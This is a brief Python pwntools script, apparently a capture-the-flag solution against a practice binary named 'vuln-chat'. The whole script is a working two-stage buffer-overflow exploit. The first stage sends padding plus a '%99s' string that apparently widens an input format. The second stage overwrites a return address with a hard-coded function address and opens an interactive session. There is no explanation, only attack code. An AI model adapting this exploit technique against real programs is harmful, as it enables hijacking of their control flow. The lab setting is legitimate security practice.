from pwn import *

buffer = b"A"*20
buff_first = b"%99s"

payload_1 = buffer
payload_1 += buff_first

print(f'payload: {payload_1}')

#p = gdb.debug('./vuln-chat')
p = process('./vuln-chat')

# overflow one
p.readuntil(b'Enter your username: ')
p.sendline(payload_1)

# overflow two
p.readuntil(b':')

payload_2 = b"A"*49
payload_2 += p32(0x0804856b)
p.sendline(payload_2)

p.interactive()
